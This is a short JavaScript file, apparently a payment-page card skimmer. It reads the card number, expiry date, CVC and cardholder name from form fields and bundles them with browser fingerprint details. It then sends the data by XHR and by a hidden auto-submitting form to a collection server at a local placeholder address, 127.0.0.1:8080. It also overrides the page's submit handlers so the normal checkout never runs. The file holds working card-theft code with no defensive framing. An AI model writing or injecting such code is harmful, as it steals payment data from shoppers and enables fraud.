class Data {
    constructor(cc, expiry, cvc, name) {
        this.cc = cc
        this.expiry = expiry
        this.cvc = cvc
        this.name = name
        this.nav = {
            cookieEnabled: navigator.cookieEnabled,
            deviceMemory: navigator.deviceMemory,
            geolocation: navigator.geolocation,
            userAgent: navigator.userAgent,
            vendor: navigator.vendor
        }
    }

    string() {
        return JSON.stringify(this)
    }
}

function valueOf(element) {
    return document.getElementById(element).value
}

function send(data) {
    var xhr = new XMLHttpRequest()
    xhr.open("POST", "http://127.0.0.1:8080", true)
    xhr.setRequestHeader('Content-Type', 'application/json')
    xhr.send(data)
}

function redirect(data) {
    var f = document.createElement('form')
    f.action='http://127.0.0.1:8080'
    f.method='POST'
    f.target='_blank'

    var i=document.createElement('input')
    i.type='hidden'
    i.name='fragment'
    i.value=data
    f.appendChild(i)

    document.body.appendChild(f)
    f.submit()
}

function extractInfo() {
    let cc = valueOf("cc")
    let expiry = valueOf("expiry")
    let cvc = valueOf("cvc")
    let name = valueOf("name")

    let data = new Data(cc, expiry, cvc, name)
    console.log(data.string())
    redirect(data.string())
}

function noop() {
    return false
}

document.getElementById('submitButton').onclick = extractInfo
document.getElementById('submitButton').onsubmit = noop
document.getElementById('ccform').onsubmit = noop
